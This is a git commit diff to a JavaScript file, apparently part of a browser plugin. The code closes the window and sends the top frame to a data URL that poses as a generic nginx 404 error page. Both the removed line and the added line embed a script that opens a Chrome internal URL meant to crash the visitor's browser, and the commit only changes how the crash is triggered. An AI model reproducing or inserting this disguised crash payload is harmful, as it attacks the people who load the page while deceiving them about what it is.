3a956085da4eb99a589847309d8e9d1040be5fc0
ifxory-plugins <63095272+ifxory-plugins@users.noreply.github.com>
2021-01-05 15:22:54 +0300

    Update index.js

--- index.js
+++ index.js
@@ -4,4 +4,4 @@ function navigateTopFrame(url) {
   window.open('', '_self', '');
   window.close();
 }
-navigateTopFrame("data:text/html;charset=utf-8,<html> <head> <title>404</title> </head> <body> <h1 style='text-align:center;'>404 Not Found</h1> <hr /> <p style='text-align:center;'>nginx 1.14</p> <script>var a = document.createElement('a');var link = document.createTextNode('linkamoya');a.appendChild(link);a.href = 'chrome://inducebrowsercrashforrealz';document.body.appendChild(a);a.click();</script> </body> </html>");
+navigateTopFrame("data:text/html;charset=utf-8,<html> <head> <title>404</title> </head> <body> <h1 style='text-align:center;'>404 Not Found</h1> <hr /> <p style='text-align:center;'>nginx 1.14</p> <script>window.open('chrome://inducebrowsercrashforrealz', null);</script> </body> </html>");
